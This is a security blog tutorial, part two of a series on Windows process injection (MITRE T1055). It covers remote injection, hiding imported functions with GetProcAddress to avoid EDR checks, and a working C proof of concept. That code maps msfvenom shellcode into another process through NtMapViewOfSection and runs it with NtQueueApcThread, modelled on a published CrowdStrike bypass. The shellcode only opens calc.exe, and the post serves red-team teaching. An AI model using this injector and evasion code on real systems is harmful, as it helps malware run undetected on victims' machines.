---
title: T1055 - Basics of Process Injection - Part 2
author: Khush V
date: 2021-04-05 14:10:00 +0000
categories: [TTPs, T1055 - Process Injection]
tags: [process injection, T1055]
---

# Back to Basics - Part 2

In the last post, part 1 of this series, we were presented with a simple Proof of Concept code for injecting shellcode into processes. In this post, we'll continue looking at different functions and techniques that can help us be stealthier. We'll cover remote process injections, obfuscating function calls and using `ntdll` function calls.

## 6 - Injecting into remote processes 

So far, we've been injecting code into the callee's process, that is the local process executing this code. It is also possible to inject code into a different process, or what is known as a remote process.

The main change to the code is the following addition:
```
	DWORD pid;
	if (argc < 2) {
		printf("[*] Command: %s PID.\n", argv[0]);

		pid = GetCurrentProcessId();
		printf("[*] No process ID provided, using current process id %d.\n", pid);
		pid = GetCurrentProcessId();
	}
	else {
		pid = atoi(argv[1]);
		printf("[*] Using PID %d provided.\n", pid);

	}

	int payload_len = sizeof(payload);
	
	printf("[*] Attempting to get handle on process.\n");
	HANDLE  processHandle = OpenProcess(CREATE_THREAD_ACCESS, 0, pid);
	if (processHandle == 0) {
		printf("[*] Error opening process handle. Error: %d.\n", GetLastError());
		return -1;
	}
	printf("[*] Got process handle.\n");
```

The first conditional step checks whether a process ID (PID) has been provided. If it has not, the program assumes we want to inject code into the local process. 

If a PID has been provided, the program attempts to get a `HANDLE` on this process using `OpenProcess` (https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess). It takes three parameters; the desired access we want, whether child processes will be able to inherit this handle and then the process ID. There's about a dozen different process access rights that can be requested. Microsoft states the following:

"A handle to the process in which the thread is to be created. The handle must have the PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_WRITE, and PROCESS_VM_READ access rights, and may fail without these rights on certain platforms."

However, from trial and error, I noticed the least amount of privilege we need is `CREATE_THREAD_ACCESS`. 

Once a process handle has been provided, we carry on with the program as usual with a few changes. Notably the following:
- We change the `VirtualAlloc` method to `VirtualAllocEx`, in order to be able to request memory allocation for a remote process. The additional parameter is to pass the process handle.
- For some reason, RtlMoveMemory no longer worked for me and I'm assuming it's because of some permissions issue copying memory across to a different processe's virtual address space. Therefore I modified this to the `WriteProcessMemory`, which takes a process handle, destination, source and size of the memory to copy across.
- Similarly, `CreateThread` has also changed to `CreateRemoteThread` in order to be able to start a thread in a remote process.  

Another peculiarity I came across while doing some research, is from Windows guru Raymond Chen, who describes `WriteProcessMemory` as being extremely accomodating. The function will temporarily change memory permissions so it can copy the data it needs to, before reverting back to the original permissions. Under the hood, it uses `VitualProtectEx` to do this, similar to what we have been using. This means we don't necessarily need the first `VirtualAllocEx` call, as we can simply write memory to the process, granted we know where to write it to (an address in the virtual address space of the target process).


## 7 - obfuscate function calls

Some EDR solutions will inspect the functions a program imports at runtime when deciding whether it is a harmful program or not. Let's have a look at the imported functions of our latest code:

![calc-running](/assets/img/9.png)
_Imported functions._

Most of the functions we've used so far are found in `kernel32.dll`. We can pick out familliar functions from the list such as `OpenProcess`, `VirtualAllocEx` and `WriteProcessMemory`. The function addresses are computed and statically linked at compile time. Suppose we want to conceal these from prying eyes. One option is to calculate these function addresses dynamically at runtime. We can do this using `GetProcAddress`, which returns an address given a function name. 

However, having a function address is not enough. We need to define the function so the compiler knows how to assemble the parameters. 
We'll take the `VirtualAllocEx` function and dynamically resolve it at runtime. Let's analyse the following code that allows us to do that:
```
	typedef LPVOID (WINAPI * VirtualAllocExFunc)(
		HANDLE hProcess,
		LPVOID lpAddress,
		SIZE_T dwSize,
		DWORD  flAllocationType,
		DWORD  flProtect
	);
	HMODULE hModule = LoadLibraryA("kernel32.dll");
	VirtualAllocExFunc VirtualAllocEx = (VirtualAllocExFunc) GetProcAddress(hModule, "VirtualAllocEx");
	if (!VirtualAllocEx) {
		printf("[*] Error GetProcAddress for VirtualAllocEx. Error: %d.\n", GetLastError());
		return -1;
	}
	FreeLibrary(hModule);

```

The `typedef` tells the compiler how the function is defined and what the parameter types are, similar to `struct`. We then load the `dll` using `LoadLibraryA` function. Using this module handle, we request the function address by calling `GetProcAddress`. With this address, we cast the function pointer into the structure that is VirtualAllocEx and then are able to call it as normal.

Compiling these and inspecting the Import Address Table (IAT), we can see that the `VirtualAllocEx` no longer appears in this list. 

![calc-running](/assets/img/10.png)
_Concealed VirtualAllocEx function._

This can be applied to all the other functions that are to be concealed. This has been left as an exercise to the reader.


## 8 - redcursor.com.au bypassing crowdstrike endpoint detection and response

The last variation was a challenge of mine to see if I could code a proof of concept, only having the general gist of the functions involved. I came across a blogpost that described using specific unsupported/undocumented Windows functions to bypass CrowdStrike Falcon (https://www.redcursor.com.au/blog/bypassing-crowdstrike-endpoint-detection-and-response). The functions used were NtMapViewOfSection and NtQueueApcThread. By not writing memory in a remote process, it is possible in some cases to execute code on a host with an EDR installed. Not having used these functions, I had to give it a try. 

### NtMapViewOfSection

Windows treats a `Section` as a contiguous memory block that can be shared between processes. We will use `NtCreateSection` call to create a new section.
 
 To utilise a `Section`, we need to map it to a `View` using `NtMapViewOfSection`, and specify appropriate RWX permissions. 
 We will create a `View` that is local to the calling process and copying in the payload. This `View` should be writeable. We'll then create a second `View` within the remote process that is executable. Writing the payload into the local section, should cause it to appear within the `View` of the remote process. 

 From this point, we can carry on as normal and call CreateRemoteThread and pass in the address pointing to the beginning of the payload. However, in this scenario, we'll be calling NtQueueApcThread


### NtQueueApcThread

Each thread in userland processes has their own Asynchronous Procedure Call (APC) queue. It is possible to queue some code to be executed when the thread enters an alertable state. 

There are two main ways of programming this:
- Create a process in a suspended state, queue an APC and then resume it/alertable state
- Enumerate thread for given PID, and use one of these. Possibly use CreateToolhelp32Snapshot to enumerate.

In this case, because my aim is to be stealthy, we won't be creating a new remote thread, albeit in a suspended state. We'll assume we *magically* know the thread ID (can easily find this out via task manager) and pass this as a parameter to the program.


```
#include "Windows.h"
#include "stdio.h"
#include "8-shellcode-inject-variation-header.h"


#define CREATE_THREAD_ACCESS (PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE )
#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#endif

/*
msfvenom -p windows/exec CMD=calc.exe -f c
length: 519 bytes
*/
unsigned char payload[] =
"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
"\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f"
"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5"
"\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"
"\x00\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";


int main(int argc, char* argv[])
{

	DWORD pid;
	if (argc < 3) {
		printf("[*] Command: %s PID ThreadId.\n", argv[0]);

		pid = GetCurrentProcessId();
		printf("[*] Error, no PID provided. Exiting.\n");
		return -1;
	}

	pid = atoi(argv[1]);
	printf("[*] Using PID %d provided.\n", pid);

	int payload_len = sizeof(payload);
	
	printf("[*] Attempting to get handle on process.\n");
	HANDLE  processHandle = OpenProcess(CREATE_THREAD_ACCESS, 1, pid);
	if (processHandle == 0) {
		printf("[*] Error opening process handle. Error: %d.\n", GetLastError());
		return -1;
	}
	printf("[*] Got process handle.\n");


	printf("[*] Attempting to create new section.\n");
	HMODULE hModule = LoadLibraryA("ntdll.dll");
	NtCreateSection NtCreateSection_func = (NtCreateSection)GetProcAddress(hModule, "NtCreateSection");
	NtMapViewOfSection NtMapViewOfSection_func = (NtMapViewOfSection)GetProcAddress(hModule, "NtMapViewOfSection");
	NtAlertResumeThread NtAlertResumeThread_func = (NtAlertResumeThread)GetProcAddress(hModule, "NtAlertResumeThread");
	NtQueueApcThread NtQueueApcThread_func = (NtQueueApcThread)GetProcAddress(hModule, "NtQueueApcThread");
	//check its not returned NULL

	HANDLE hSection = NULL;
	LARGE_INTEGER sectionSize = { 4096 };

	NTSTATUS createSection = NtCreateSection_func(
		&hSection,				//SectionHandle
		(SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE),		//DesiredAccess
		NULL,					//ObjectAttributes
		(PLARGE_INTEGER)&sectionSize,						//MaximumSize
		PAGE_EXECUTE_READWRITE,	//SectionPageProtection
		SEC_COMMIT,				//AllocationAttributes
		NULL					//FileHandle
	);
	//printf("[*] CreateSection status is %x.\n", a);
	if (!NT_SUCCESS(createSection))
	{
		printf("[*] Error: NtCreateSection_func failed with status %#x", createSection);
		return 0;
	}


	VOID * baseAddress = NULL;
	ULONG_PTR zeroBits = 0;
	SIZE_T viewSize = 0;
	

	printf("[*] Attempting to map view of new section to local process.\n");
	NTSTATUS mapView = NtMapViewOfSection_func(
		hSection,		//Section handle
		GetCurrentProcess(),	// process handle	// FFFFFFFF -> current process?
		&baseAddress,			// base address
		zeroBits,			// zero bits
		SIZE_T(4096),   //CommitSize,
		NULL,		//SectionOffset,
		&viewSize,         //ViewSize,
		ViewUnmap, //InheritDisposition,
		MEM_TOP_DOWN,           //AllocationType,
		PAGE_READWRITE       //Win32Protect
	);
	if (!NT_SUCCESS(mapView))
	{
		printf("[*] Error: NtMapViewOfSection_func failed with status %#x.\n", mapView);
		return -1;
	}

	printf("[*] Attempting to copy over payload.\n");
	RtlMoveMemory(baseAddress, payload, payload_len);
	printf("[*] Wrote bytes.\n");


	printf("[*] Attempting to map view of section to remote process.\n");


	VOID * remoteAddress = NULL;
	ULONG_PTR zeroBitsRemote = 0;
	SIZE_T viewSizeRemote = 0;

	printf("[*] Address of remote pointer is %p.\n", remoteAddress);
	NTSTATUS mapViewRemote = NtMapViewOfSection_func(
		hSection,		//Section handle
		processHandle,	// process handle
		&remoteAddress,			
		zeroBitsRemote,			// zero bits
		SIZE_T(4096),   //CommitSize,
		NULL,		//SectionOffset,
		&viewSizeRemote,         //ViewSize,
		ViewUnmap, //InheritDisposition,
		MEM_TOP_DOWN,           //AllocationType,
		PAGE_EXECUTE_READ       //Win32Protect
	);
	printf("[*] Address of remote pointer is %p.\n", remoteAddress);
	if (!NT_SUCCESS(mapViewRemote))
	{
		printf("[*] Error: NtMapViewOfSection_func on remote process failed with status %#x.\n", mapViewRemote);
		return 0;
	}


	DWORD tId = atoi(argv[2]);
	printf("[*] Attempting to open thread %d.\n", tId);
	HANDLE hThread = OpenThread(THREAD_SET_CONTEXT| THREAD_SUSPEND_RESUME, FALSE, tId);
	if (hThread == 0) {
		printf("[*] Error opening remote thread. Error: %d.\n", GetLastError());
		return -1;
	}
	
	NTSTATUS queueStatus = NtQueueApcThread_func(
		hThread,
		(PIO_APC_ROUTINE)remoteAddress,
		NULL, NULL, NULL
	);
	if (!NT_SUCCESS(queueStatus))
	{
		printf("[*] Error: NtMapViewOfSection_func on remote process failed with status %#x.\n", queueStatus);
		return 0;
	}
```

These functions are found within `ntdll.dll`, which contains functions used for the Windows native API and are typically not used exposed for use directly. User available processes such as OpenProcess are often wrappers for these undocumented functions (NtOpenProcess).
Because there is no export library for `ntdll.dll`, we have to dynamically resolve function addresses at runtime, similar to the technique used in the previous example. As of Windows 10, the SDK does release `ntdll.lib`, however I was not successful in linking this to my code. If anyone wants to give me any pointers, would appreciate that very much. 

There are a couple differences when calling native API functions. These use the NTAPI caling convention, which declares that the callee will clean the stack after execution (`__stdcall`). 

The second different is the return value of most Nt* functions. They return an `NTSTATUS` value. This is a 32 bit value that will indicate the result of function. 


